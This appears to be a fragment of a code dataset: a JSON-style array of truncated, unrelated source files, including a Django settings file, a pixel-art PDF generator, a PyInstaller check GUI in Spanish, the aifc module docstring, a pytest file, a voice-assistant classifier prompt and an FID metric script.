separated_texts[0],\n                                            \"price\": float(str(separated_texts[2]).replace(\"'\", \"\")),\n                                            \"link\": \"https://www.ricardo.ch\"+result.get('href')})\n                    elif len(separated_texts) == 4:\n                        v_results.append({  \"shop\": name,\n                                            \"image\": img,\n                                            \"title\": separated_texts[0],\n  ",
    "\"\"\"\nDjango settings for cfhome project.\n\nGenerated by 'django-admin startproject' using Django 5.1.4.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/5.1/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/5.1/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\nfrom helpers import config\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/5.1/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = config('DJANGO_SECRET_KEY', cast=str)\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'cfhome.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'cfhome.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/5.1/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR / 'db.sqlite3',\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/5.1/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/5.1/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/5.1/howto/static-files/\n\nSTATIC_URL = 'static/'\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/5.1/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n",
    "import os\nimport argparse\nfrom PIL import Image\nimport numpy as np\nfrom sklearn.cluster import KMeans\nfrom reportlab.pdfgen import canvas\nfrom reportlab.lib.pagesizes import letter\nfrom reportlab.lib.units import inch\nfrom reportlab.pdfbase import pdfmetrics\nfrom reportlab.pdfbase.ttfonts import TTFont\nfrom reportlab.lib import colors\nimport webcolors\n\ndef get_color_name(rgb):\n    \"\"\"\n    Get the closest matching color name for an RGB value.\n    \"\"\"\n    def rgb_to_name(rgb_tuple):\n        # Dictionary of basic colors and their RGB values\n        basic_colors = {\n            'red': (255, 0, 0),\n            'green': (0, 255, 0),\n            'blue': (0, 0, 255),\n            'yellow': (255, 255, 0),\n            'orange': (255, 165, 0),\n            'purple': (128, 0, 128),\n            'brown': (165, 42, 42),\n            'pink': (255, 192, 203),\n            'grey': (128, 128, 128),\n            'black': (0, 0, 0),\n            'white': (255, 255, 255),\n            'tan': (210, 180, 140),\n            'light blue': (173, 216, 230),\n            'dark blue': (0, 0, 139),\n            'light green': (144, 238, 144),\n            'dark green': (0, 100, 0),\n            'light grey': (211, 211, 211),\n            'dark grey': (169, 169, 169),\n            'navy': (0, 0, 128),\n            'maroon': (128, 0, 0)\n        }\n        \n        min_distance = float('inf')\n        closest_color = 'unknown'\n        \n        for color_name, color_rgb in basic_colors.items():\n            distance = sum((c1 - c2) ** 2 for c1, c2 in zip(rgb_tuple, color_rgb))\n            if distance < min_distance:\n                min_distance = distance\n                closest_color = color_name\n                \n        return closest_color\n    \n    return rgb_to_name(tuple(rgb))\n\ndef load_and_resize_image(image_path, target_width, target_height):\n    \"\"\"\n    Load an image and resize it to the specified dimensions using nearest neighbor sampling\n    to maintain sharp edges suitable for pixel art.\n    \"\"\"\n    with Image.open(image_path) as img:\n        if img.mode != 'RGB':\n            img = img.convert('RGB')\n        return img.resize((target_width, target_height), Image.Resampling.NEAREST)\n\ndef create_high_res_pixel_art(small_image, target_size=1000):\n    \"\"\"\n    Scale up the pixel art to a higher resolution while maintaining sharp edges.\n    Maintains aspect ratio while ensuring the longer side is target_size pixels.\n    \"\"\"\n    width, height = small_image.size\n    if width > height:\n        new_width = target_size\n        new_height = int(height * (target_size / width))\n    else:\n        new_height = target_size\n        new_width = int(width * (target_size / height))\n    \n    return small_image.resize((new_width, new_height), Image.Resampling.NEAREST)\n\ndef quantize_colors(image, max_colors=8):\n    \"\"\"\n    Reduce the number of colors in the image using K-means clustering.\n    Returns the quantized image and the palette of colors used.\n    \"\"\"\n    pixels = np.array(image)\n    original_shape = pixels.shape\n    pixels_2d = pixels.reshape(-1, 3)\n    \n    unique_colors = np.unique(pixels_2d, axis=0)\n    n_colors = min(len(unique_colors), max_colors)\n    \n    kmeans = KMeans(n_clusters=n_colors, random_state=42)\n    kmeans.fit(pixels_2d)\n    \n    palette = kmeans.cluster_centers_.astype(int)\n    quantized_pixels = kmeans.predict(pixels_2d)\n    \n    color_mapping = {i: i+1 for i in range(n_colors)}\n    color_grid = quantized_pixels.reshape(original_shape[:2])\n    number_grid = np.vectorize(color_mapping.get)(color_grid)\n    \n    quantized_image = Image.fromarray(np.uint8(palette[quantized_pixels].reshape(original_shape)))\n    \n    return number_grid, palette, quantized_image\n\ndef create_numbered_pdf(number_grid, palette, output_path, title):\n    \"\"\"\n    Create a PDF with the numbered grid and color key.\n    Grid width is fixed at 8 inches on a standard 8.5x11\" page.\n    \"\"\"\n    c = canvas.Canvas(output_path, pagesize=letter)\n    \n    # Add title at the top\n    c.setFont(\"Helvetica\", 16)\n    c.drawString(1 * inch, 10.5 * inch, title)\n    \n    # Set up dimensions\n    grid_height, grid_width = number_grid.shape\n    cell_size = 8 * inch / grid_width  # 8 inch width divided by number of cells\n    \n    # Calculate total grid height in inches\n    grid_height_inches = cell_size * grid_height / inch\n    \n    # Start position (centering the grid horizontally)\n    start_x = (8.5 * inch - (grid_width * cell_size)) / 2\n    start_y = 10 * inch  # Start near top of page, leaving room for title\n    \n    # Draw grid and numbers\n    for i in range(grid_height):\n        for j in range(grid_width):\n            # Draw cell borders\n            x = start_x + (j * cell_size)\n            y = start_y - ((i + 1) * cell_size)\n            c.rect(x, y, cell_size, cell_size)\n            \n            # Add number (centered in cell)\n            number = int(number_grid[i][j])\n            c.setFont(\"Helvetica\", min(cell_size * 0.7, 10))\n            c.drawString(\n                x + (cell_size * ",
    "import os\nimport subprocess\nimport tkinter as tk\nfrom tkinter import messagebox\nimport pyperclip\nimport re\n\n# Funci\u00f3n para ejecutar PyInstaller y obtener la ruta absoluta\ndef ejecutar_pyinstaller():\n    try:\n        # Obtener el directorio donde se est\u00e1 ejecutando el script Python\n        script_dir = os.path.dirname(os.path.abspath(__file__))\n\n        # Ejecutar pyinstaller en el mismo directorio donde est\u00e1 el script\n        proceso = subprocess.Popen(\n            ['pyinstaller', '--version'],  # Usamos '--version' para verificar si pyinstaller funciona correctamente\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            cwd=script_dir  # Establece el directorio de trabajo en el directorio del script\n        )\n\n        # Obtener la salida y los errores del comando\n        stdout, stderr = proceso.communicate()\n\n        # Verificar si hubo un error\n        if proceso.returncode == 0:\n            # Si no hay error, pyinstaller funciona correctamente\n            ruta_absoluta = os.path.abspath(script_dir)  # Obtiene la ruta del directorio actual del script\n            mostrar_ventana(f\"PyInstaller est\u00e1 funcionando correctamente.\\n\\nPuedes usar pyinstaller desde este directorio:\\n{ruta_absoluta}\", ruta_absoluta)\n        else:\n            # Si hay un error, buscar la ruta del error\n            error_message = stderr.decode(\"utf-8\")\n            # Usamos expresi\u00f3n regular para encontrar la ruta dentro del mensaje de error\n            match = re.search(r\"(C:\\\\[^\\\\]+\\\\Scripts\\\\pyinstaller\\.py)\", error_message)\n            if match:\n                # Extraemos la ruta del error\n                ruta_error = match.group(1)\n                mostrar_ventana(f\"Hubo un error con PyInstaller. Puede que el archivo pyinstaller.py est\u00e9 en esta ruta:\\n{ruta_error}\", ruta_error)\n            else:\n                # Si no encontramos la ruta, mostramos el error completo\n                mostrar_ventana(f\"Hubo un error con PyInstaller:\\n{error_message}\", None)\n\n    except Exception as e:\n        # Si ocurre un error general, mostrarlo\n        messagebox.showerror(\"Error\", f\"Ocurri\u00f3 un error al ejecutar PyInstaller:\\n{str(e)}\")\n\n# Funci\u00f3n para mostrar una ventana con la ruta y la opci\u00f3n de copiarla\ndef mostrar_ventana(mensaje, ruta):\n    # Crear la ventana principal\n    ventana = tk.Tk()\n    ventana.title(\"Resultado de PyInstaller\")\n    ventana.geometry(\"700x450\")\n    ventana.config(bg=\"#1a1a1a\")  # Fondo oscuro, t\u00edpico de est\u00e9tica hacker\n    \n    # T\u00edtulo en la parte superior\n    label_titulo = tk.Label(\n        ventana,\n        text=\"PyInstaller Status\",\n        font=(\"Courier New\", 18, \"bold\"),\n        bg=\"#1a1a1a\",\n        fg=\"#33ff33\",  # Verde brillante\n        pady=10\n    )\n    label_titulo.pack(pady=10)\n    \n    # Etiqueta con el mensaje\n    label_mensaje = tk.Label(\n        ventana,\n        text=mensaje,\n        font=(\"Courier New\", 12),\n        bg=\"#1a1a1a\",\n        fg=\"#d1d1d1\",  # Color gris claro para el texto\n        justify=\"left\",\n        padx=20,\n        pady=10\n    )\n    label_mensaje.pack(pady=10)\n    \n    # Si hay una ruta, agregar un bot\u00f3n para copiarla al portapapeles\n    if ruta:\n        def copiar_al_portapapeles():\n            pyperclip.copy(ruta)\n            messagebox.showinfo(\"Copiado\", \"La ruta ha sido copiada al portapapeles.\")\n        \n        # Bot\u00f3n para copiar la ruta\n        boton_copiar = tk.Button(\n            ventana,\n            text=\"Copiar al Portapapeles\",\n            font=(\"Courier New\", 12),\n            command=copiar_al_portapapeles,\n            bg=\"#4CAF50\",  # Verde hacker\n            fg=\"white\",\n            relief=\"flat\",\n            padx=20,\n            pady=10,\n            bd=0,  # Sin borde\n            activebackground=\"#388E3C\",  # Color cuando el bot\u00f3n es presionado\n            activeforeground=\"white\"\n        )\n        boton_copiar.pack(pady=20)\n    \n    # Bot\u00f3n de salir\n    boton_salir = tk.Button(\n        ventana,\n        text=\"Salir\",\n        font=(\"Courier New\", 12),\n        command=ventana.quit,\n        bg=\"#ff3333\",  # Rojo brillante\n        fg=\"white\",\n        relief=\"flat\",\n        padx=20,\n        pady=10,\n        bd=0,  # Sin borde\n        activebackground=\"#D32F2F\",  # Color cuando el bot\u00f3n es presionado\n        activeforeground=\"white\"\n    )\n    boton_salir.pack(pady=10)\n    \n    # Fondo de consola con efecto de sombra para dar aspecto de terminal\n    ventana.lift()\n    ventana.attributes(\"-topmost\", True)  # Mantener la ventana siempre encima\n    ventana.after(100, lambda: ventana.attributes(\"-topmost\", False))  # Hacerla no siempre encima despu\u00e9s de unos segundos\n\n    ventana.mainloop()\n\n# Ejecutar el script\nif __name__ == \"__main__\":\n    ejecutar_pyinstaller()\n",
    "\"\"\"Stuff to parse AIFF-C and AIFF files.\n\nUnless explicitly stated otherwise, the description below is true\nboth for AIFF-C files and AIFF files.\n\nAn AIFF-C file has the following structure.\n\n  +-----------------+\n  | FORM            |\n  +-----------------+\n  | <size>          |\n  +----+------------+\n  |    | AIFC       |\n  |    +------------+\n  |    | <chunks>   |\n  |    |    .       |\n  |    |    .       |\n  |    |    .       |\n  +----+------------+\n\nAn AIFF file has the string \"AIFF\" instead of \"AIFC\".\n\nA chunk consists of an identifier (4 bytes) followed by a size (4 bytes,\nbig endian order), followed by the data.  The size field does not include\nthe size of the 8 byte header.\n\nThe following chunk types are recognized.\n\n  FVER\n      <version number of AIFF-C defining document> (AIFF-C only).\n  MARK\n      <# of markers> (2 bytes)\n      list of markers:\n          <marker ID> (2 bytes, must be > 0)\n          <position> (4 bytes)\n          <marker name> (\"pstring\")\n  COMM\n      <# of channels> (2 bytes)\n      <# of sound frames> (4 bytes)\n      <size of the samples> (2 bytes)\n      <sampling frequency> (10 bytes, IEEE 80-bit extended\n          floating point)\n      in AIFF-C files only:\n      <compression type> (4 bytes)\n      <human-readable version of compression type> (\"pstring\")\n  SSND\n      <offset> (4 bytes, not used by this program)\n      <blocksize> (4 bytes, not used by this program)\n      <sound data>\n\nA pstring consists of 1 byte length, a string of characters, and 0 or 1\nbyte pad to make the total length even.\n\nUsage.\n\nReading AIFF files:\n  f = aifc.open(file, 'r')\nwhere file is either the name of a file or an open file pointer.\nThe open file pointer must have methods read(), seek(), and close().\nIn some types of audio files, if the setpos() method is not used,\nthe seek() method is not necessary.\n\nThis returns an instance of a class with the following public methods:\n  getnchannels()  -- returns number of audio channels (1 for\n             mono, 2 for stereo)\n  getsampwidth()  -- returns sample width in bytes\n  getframerate()  -- returns sampling frequency\n  getnframes()    -- returns number of audio frames\n  getcomptype()   -- returns compression type ('NONE' for AIFF files)\n  getcompname()   -- returns human-readable version of\n             compression type ('not compressed' for AIFF files)\n  getparams() -- returns a namedtuple consisting of all of the\n             above in the above order\n  getmarkers()    -- get the list of marks in the audio file or None\n             if there are no marks\n  getmark(id) -- get mark with the specified id (raises an error\n             if the mark does not exist)\n  readframes(n)   -- returns at most n frames of audio\n  rewind()    -- rewind to the beginning of the audio stream\n  setpos(pos) -- seek to the specified position\n  tell()      -- return the current position\n  close()     -- close the instance (make it unusable)\nThe position returned by tell(), the position given to setpos() and\nthe position of marks are all compatible and have nothing to do with\nthe actual position in the file.\nThe close() method is called automatically when the class instance\nis destroyed.\n\nWriting AIFF files:\n  f = aifc.open(file, 'w')\nwhere file is either the name of a file or an open file pointer.\nThe open file pointer must have methods write(), tell(), seek(), and\nclose().\n\nThis returns an instance of a class with the following public methods:\n  aiff()      -- create an AIFF file (AIFF-C default)\n  aifc()      -- create an AIFF-C file\n  setnchannels(n) -- set the number of channels\n  setsampwidth(n) -- set the sample width\n  setframerate(n) -- set the frame rate\n  setnframes(n)   -- set the number of frames\n  setcomptype(type, name)\n          -- set the compression type and the\n             human-readable compression type\n  setparams(tuple)\n          -- set all parameters at once\n  setmark(id, pos, name)\n          -- add specified mark to the list of marks\n  tell()      -- return current position in output file (useful\n             in combination with setmark())\n  writeframesraw(data)\n          -- write audio frames without pathing up the\n             file header\n  writeframes(data)\n          -- write audio frames and patch up the file header\n  close()     -- patch up the file header and close the\n             output file\nYou should set the parameters before the first writeframesraw or\nwriteframes.  The total number of frames does not need to be set,\nbut when it is set to the correct value, the header does not have to\nbe patched up.\nIt is best to first set all parameters, perhaps possibly the\ncompression type, and then write audio frames using writeframesraw.\nWhen all frames have been written, either call writeframes(b'') or\nclose() to patch up the sizes in the header.\nMarks can be added anytime.  If there are any marks, you must call\nclose() after all frames have been written.\nThe close() method is called automatically when the class instance\nis destroyed.\n\nWhen a file is opene",
    "\"\"\"Tests for the Analysis Planning Node.\"\"\"\n\nimport pytest\nimport os\nfrom pathlib import Path\nfrom git import Repo\n\nfrom datetime import datetime\n\nfrom unittest.mock import patch\n\nfrom gitsage.nodes.planning_node import planning_node\nfrom gitsage.models.base import CommitInfo\nfrom gitsage.models.analysis import AnalysisPlan\nfrom gitsage.models.state import AgentState\n\n\n@pytest.fixture\ndef api_key():\n    \"\"\"Get Groq API key from environment.\"\"\"\n    key = os.environ.get(\"GROQ_API_KEY\")\n    if not key:\n        pytest.skip(\"GROQ_API_KEY not set in environment\")\n    return key\n\n\n@pytest.fixture\ndef mock_message_analysis():\n    \"\"\"Mock response for commit message analysis.\"\"\"\n    suggestion = (\n        \"Consider adding more details about the implementation, \"\n        \"such as where the authentication was added (files, functions) \"\n        \"and how it integrates with the existing system.\"\n    )\n    return {\n        \"message_clarity\": 0.9,\n        \"needs_code_review\": True,\n        \"suggested_improvements\": [suggestion],\n        \"is_breaking_change\": False,\n    }\n\n\ndef create_test_commit(repo: Repo, message: str, content: str) -> str:\n    \"\"\"Helper to create a test commit.\"\"\"\n    test_file = Path(repo.working_dir) / \"test.py\"\n    test_file.write_text(content)\n    repo.index.add([str(test_file)])\n    commit = repo.index.commit(message)\n    return commit.hexsha\n\n\n@pytest.fixture\ndef sample_repo(tmp_path):\n    \"\"\"Create a repository with various commit types.\"\"\"\n    repo_path = tmp_path / \"test_repo\"\n    repo_path.mkdir()\n    repo = Repo.init(repo_path)\n\n    commits = []\n\n    # Clear, conventional commit\n    commits.append(\n        create_test_commit(\n            repo,\n            \"\"\"feat: Add user authentication\n\n        Implements OAuth2 authentication flow with:\n        - Google sign-in support\n        - JWT token handling\n        - Session management\n\n        No breaking changes.\"\"\",\n            \"def authenticate(): pass\",\n        )\n    )\n\n    # Unclear commit\n    commits.append(create_test_commit(repo, \"fixed auth stuff\", \"def auth(): return True\"))\n\n    # Breaking change\n    commits.append(\n        create_test_commit(\n            repo,\n            \"\"\"refactor: Update API endpoints\n\n        BREAKING CHANGE: Authentication endpoints now require API key\n        - Modified response format\n        - Updated error handling\n        - Added rate limiting\"\"\",\n            \"class APIAuth: pass\",\n        )\n    )\n\n    return repo_path, commits\n\n\n@pytest.mark.asyncio\nasync def test_planning_node_run(sample_repo, api_key, mock_message_analysis):\n    \"\"\"Test the complete planning node execution.\"\"\"\n    repo_path, commit_hashes = sample_repo\n\n    with patch(\"langchain_core.runnables.base.RunnableSerializable.ainvoke\") as mock_invoke:\n        mock_invoke.return_value = mock_message_analysis\n\n        # Create initial state\n        initial_state: AgentState = {\n            \"groq_api_key\": api_key,\n            \"repo_path\": repo_path,\n            \"commits\": [\n                CommitInfo(\n                    hash=commit_hash,\n                    message=\"Test commit\",\n                    author=\"Test Author\",\n                    date=datetime.now(),\n                    files_changed=[\"test.py\"],\n                )\n                for commit_hash in commit_hashes\n            ],\n        }\n\n        # Run planning node\n        result = await planning_node(initial_state)\n\n        # Verify state updates\n        assert \"commit_clarity\" in result\n        assert len(result[\"commit_clarity\"]) == len(commit_hashes)\n        assert \"commits_needing_review\" in result\n        assert \"analysis_plan\" in result\n\n        # Check analysis plan structure using dataclass attributes\n        plan: AnalysisPlan = result[\"analysis_plan\"]\n        assert \"target_audiences\" in plan\n        assert \"required_formats\" in plan\n        assert \"focus_areas\" in plan\n        assert \"additional_analysis_needed\" in plan\n        assert \"risk_level\" in plan\n\n        # Validate analysis plan content\n        assert isinstance(plan[\"target_audiences\"], list)\n        assert isinstance(plan[\"required_formats\"], list)\n        assert isinstance(plan[\"focus_areas\"], list)\n        assert isinstance(plan[\"additional_analysis_needed\"], bool)\n        assert plan[\"risk_level\"] in [\"high\", \"normal\"]\n\n        # Validate specific content expectations\n        assert \"developers\" in plan[\"target_audiences\"]\n        assert \"markdown\" in plan[\"required_formats\"]\n        assert any(area in [\"features\", \"code_changes\"] for area in plan[\"focus_areas\"])\n",
    "import cohere\r\nimport webbrowser\r\nfrom AppOpener import open, close\r\nimport google.generativeai as genai\r\nfrom change_wallpaper import set_wallpaper\r\n\r\nco = cohere.ClientV2(\"YOUR_API_KEY\") # cohere api key\r\ngenai.configure(api_key=\"YOUR_API_KEY\") # gemini api key\r\n\r\nmodel = genai.GenerativeModel(\"gemini-1.5-flash\")\r\n\r\npreamble = \"\"\"\r\nYou are a highly accurate Decision-Making Model designed to categorize user queries into specific types. Your job is to decide whether a query is a 'general' query, a 'realtime' query, or is asking to perform a task or automation, such as 'open Facebook', 'write an application and open it in Notepad'.\r\n\r\n*** Do not answer any query. Only decide and classify the type of query. ***\r\n\r\nRules:\r\n1. Respond with **'general (query)'** if:\r\n   - The query can be answered by a conversational AI model (e.g., LLM) without requiring real-time or up-to-date information.  \r\n     Examples:  \r\n       'Who was Akbar?' \u2192 'general who was Akbar?'  \r\n       'How can I study more effectively?' \u2192 'general how can I study more effectively?'  \r\n       'Can you help me with this math problem?' \u2192 'general can you help me with this math problem?'  \r\n       'What is Python programming language?' \u2192 'general what is Python programming language?'  \r\n   - The query is incomplete, ambiguous, or lacks proper context.  \r\n     Examples:  \r\n       'Who is he?' \u2192 'general who is he?'  \r\n       'What\u2019s his net worth?' \u2192 'general what\u2019s his net worth?'  \r\n       'Tell me more about him.' \u2192 'general tell me more about him.'  \r\n   - The query is about the time, day, date, or other time-related topics.  \r\n     Examples:  \r\n       'What\u2019s the time?' \u2192 'general what\u2019s the time?'  \r\n       'What day is it?' \u2192 'general what day is it?'  \r\n   - The query does not match any other categories or includes a task not defined in the rules.\r\n\r\n2. Respond with **'open (application name)'** if:\r\n   - The query asks to open an application.  \r\n     Example: 'Open Notepad.' \u2192 'open notepad'  \r\n   - For multiple applications:  \r\n     Example: 'Open Notepad and Telegram.' \u2192 'open notepad, open telegram'\r\n\r\n\r\n3. Respond with **'close (application name)'** if:\r\n   - The query asks to close an application.  \r\n     Example: 'Close Telegram.' \u2192 'close telegram'  \r\n   - For multiple applications:  \r\n     Example: 'Close Telegram and Spotify.' \u2192 'close telegram, close spotify'\r\n\r\n4. Respond with **'search (search_engine) (query)'** if:\r\n   - The query asks to search for something online using a specific search engine (default: Google).  \r\n     Examples:  \r\n       'Search how to learn Python on Google.' \u2192 'search google how to learn python'  \r\n       'Search for AI news on Bing.' \u2192 'search bing ai news'\r\n\r\n5. Respond with **'open_site (https://site_name.com)'** if:\r\n   - The query asks to open a website.  \r\n     Example: 'Open YouTube.' \u2192 'open_site (https://youtube.com)'  \r\n   - For multiple websites:  \r\n     Example: 'Open YouTube and Google.' \u2192 'open_site (https://youtube.com), open_site (https://google.com)'\r\n\r\n6. Respond with **'youtube (query)'** if:\r\n   - The query asks to perform a task on YouTube (e.g., searching, playing content).  \r\n     Example: 'Search tutorials on YouTube.' \u2192 'youtube search tutorials'\r\n\r\n7. Respond with **'play (song name)'** if:\r\n   - The query asks to play a song.  \r\n     Example: 'Play Let Her Go.' \u2192 'play let her go'  \r\n   - For multiple songs:  \r\n     Example: 'Play Let Her Go and Afsanay.' \u2192 'play let her go, play afsanay'\r\n\r\n8. Respond with **'reminder (datetime with message)'** if:\r\n   - The query asks to set a reminder.  \r\n     Example: 'Set a reminder at 9:00 PM on June 25 for my business meeting.' \u2192 'reminder 9:00pm 25th june business meeting'\r\n\r\n9. Respond with **'system (task name)'** if:\r\n   - The query asks to perform system-related tasks (e.g., mute, unmute, volume control).  \r\n     Example: 'Mute the system.' \u2192 'system mute'  \r\n   - For multiple tasks:  \r\n     Example: 'Mute the system and lower the volume.' \u2192 'system mute, system volume down'\r\n\r\n10. Respond with **'google search (topic)'** if:\r\n    - The query asks to search a specific topic on Google.  \r\n      Example: 'Google search for AI models.' \u2192 'google search ai models'  \r\n    - For multiple topics:  \r\n      Example: 'Search AI models and machine learning techniques on Google.' \u2192 'google search ai models, google search machine learning techniques'\r\n\r\n11. Respond with **'youtube search (topic)'** if:\r\n    - The query asks to search for a topic on YouTube.  \r\n      Example: 'Search for Python tutorials on YouTube.' \u2192 'youtube search python tutorials'\r\n\r\n12. Respond with **'wallpaper (topic)'** if:\r\n    - The query asks to change the wallpaper or background.  \r\n      Example: 'Change the wallpaper to a sunset.' \u2192 'wallpaper change to sunset'\r\n\r\n13. For multiple tasks, combine responses for each task.  \r\n    Example: 'Open Facebook, close WhatsApp, and play Let Her Go.' \u2192 'open facebook, close whatsapp, play let her go'\r\n\r\n14. Respond with **'",
    "#!/usr/bin/env python3\n\"\"\"Calculates the Frechet Inception Distance (FID) to evalulate GANs\n\nThe FID metric calculates the distance between two distributions of images.\nTypically, we have summary statistics (mean & covariance matrix) of one\nof these distributions, while the 2nd distribution is given by a GAN.\n\nWhen run as a stand-alone program, it compares the distribution of\nimages that are stored as PNG/JPEG at a specified location with a\ndistribution given by summary statistics (in pickle format).\n\nThe FID is calculated by assuming that X_1 and X_2 are the activations of\nthe pool_3 layer of the inception net for generated samples and real world\nsamples respectively.\n\nSee --help to see further details.\n\nCode apapted from https://github.com/bioinf-jku/TTUR to use PyTorch instead\nof Tensorflow\n\nCopyright 2018 Institute of Bioinformatics, JKU Linz\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n   http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\"\"\"\nimport os\nimport pathlib\n\nimport numpy as np\nimport torch\nfrom scipy import linalg\nfrom torch.nn.functional import adaptive_avg_pool2d\nimport os\n\nfrom PIL import Image\n\ntry:\n    from tqdm import tqdm\nexcept ImportError:\n    # If not tqdm is not available, provide a mock version of it\n    def tqdm(x): return x\n\nfrom .inception import InceptionV3\n\ndef imread(filename):\n    \"\"\"\n    Loads an image file into a (height, width, 3) uint8 ndarray.\n    \"\"\"\n    return np.asarray(Image.open(filename), dtype=np.uint8)[..., :3]\n\n\ndef get_activations(files, model, batch_size=50, dims=2048,\n                    cuda=False, verbose=False):\n    \"\"\"Calculates the activations of the pool_3 layer for all images.\n\n    Params:\n    -- files       : List of image files paths\n    -- model       : Instance of inception model\n    -- batch_size  : Batch size of images for the model to process at once.\n                     Make sure that the number of samples is a multiple of\n                     the batch size, otherwise some samples are ignored. This\n                     behavior is retained to match the original FID score\n                     implementation.\n    -- dims        : Dimensionality of features returned by Inception\n    -- cuda        : If set to True, use GPU\n    -- verbose     : If set to True and parameter out_step is given, the number\n                     of calculated batches is reported.\n    Returns:\n    -- A numpy array of dimension (num images, dims) that contains the\n       activations of the given tensor when feeding inception with the\n       query tensor.\n    \"\"\"\n    model.eval()\n\n    if batch_size > len(files):\n        print(('Warning: batch size is bigger than the data size. '\n               'Setting batch size to data size'))\n        batch_size = len(files)\n\n    pred_arr = np.empty((len(files), dims))\n\n    for i in tqdm(range(0, len(files), batch_size)):\n        if verbose:\n            print('\\rPropagating batch %d/%d' % (i + 1, n_batches),\n                  end='', flush=True)\n        start = i\n        end = i + batch_size\n\n        images = np.array([imread(str(f)).astype(np.float32)\n                           for f in files[start:end]])\n\n        # Reshape to (n_images, 3, height, width)\n        images = images.transpose((0, 3, 1, 2))\n        images /= 255\n\n        batch = torch.from_numpy(images).type(torch.FloatTensor)\n        if cuda:\n            batch = batch.cuda()\n\n        pred = model(batch)[0]\n\n        # If model output is not scalar, apply global spatial average pooling.\n        # This happens if you choose a dimensionality not equal 2048.\n        if pred.size(2) != 1 or pred.size(3) != 1:\n            pred = adaptive_avg_pool2d(pred, output_size=(1, 1))\n\n        pred_arr[start:end] = pred.cpu().data.numpy().reshape(pred.size(0), -1)\n\n    if verbose:\n        print(' done')\n\n    return pred_arr\n\n\ndef calculate_frechet_distance(mu1, sigma1, mu2, sigma2, eps=1e-6):\n    \"\"\"Numpy implementation of the Frechet Distance.\n    The Frechet distance between two multivariate Gaussians X_1 ~ N(mu_1, C_1)\n    and X_2 ~ N(mu_2, C_2) is\n            d^2 = ||mu_1 - mu_2||^2 + Tr(C_1 + C_2 - 2*sqrt(C_1*C_2)).\n\n    Stable version by Dougal J. Sutherland.\n\n    Params:\n    -- mu1   : Numpy array containing the activations of a layer of the\n               inception net (like returned by the function 'get_predictions')\n               for generated samples.\n    -- mu2   : The sample mean over activations, precalculated on an\n               representative data set.\n    -- sigma1: The covariance matrix over activations for generated samples.\n    -- sigma2: The covaria",
